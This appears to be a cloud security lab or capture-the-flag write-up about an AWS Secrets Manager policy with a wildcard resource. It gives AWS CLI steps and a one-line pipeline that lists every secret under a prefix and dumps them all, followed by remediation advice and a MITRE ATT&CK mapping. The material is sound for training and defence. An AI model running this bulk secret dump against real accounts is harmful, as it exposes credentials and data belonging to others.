# Secrets Manager Over-Permissive Policy

**Provider:** AWS | **Category:** IAM / Secrets Management

## Scenario

A monitoring service account was granted `secretsmanager:GetSecretValue` with
`Resource: "arn:aws:secretsmanager:eu-west-1:*:secret:/cumulonimbus/*"` — a path-level
wildcard instead of the specific secret ARN it actually needs. Combined with
`secretsmanager:ListSecrets` on `*`, the attacker can enumerate every secret in the
account under that prefix and dump all of them, including the flag.

## Attack Path

```
[Attacker] svc-monitoring-<id>
    |
    v
aws secretsmanager list-secrets  -->  find all /cumulonimbus/production/* secrets
    |
    v
aws secretsmanager get-secret-value --secret-id <arn>  (for each secret)
    |
    v
/cumulonimbus/production/flag-<id>  -->  flag
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker
# Region: eu-west-1
```

### Step 2 — List all secrets

```bash
aws secretsmanager list-secrets --profile attacker \
  --query "SecretList[].ARN" --output text
```

### Step 3 — Dump each secret

```bash
# Single secret
aws secretsmanager get-secret-value \
  --secret-id <arn> \
  --profile attacker \
  --query SecretString --output text

# Dump all secrets under the prefix in one shot
aws secretsmanager list-secrets --profile attacker \
  --query "SecretList[].ARN" --output text | \
  tr '\t' '\n' | \
  xargs -I{} aws secretsmanager get-secret-value \
    --secret-id {} --profile attacker \
    --query SecretString --output text
```

## How to Fix in Production

1. **Scope `secretsmanager:GetSecretValue` to the exact secret ARN**, never to a path prefix or `*`.
2. **Use separate IAM identities per service** — each Lambda/container reads only its own secret.
3. **Enable automatic rotation** so that even if credentials leak, they expire quickly.
4. **Enable AWS CloudTrail** and alert on `GetSecretValue` calls from unexpected identities.
5. **Use resource-based policies on secrets** as a second layer of control independent of IAM.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
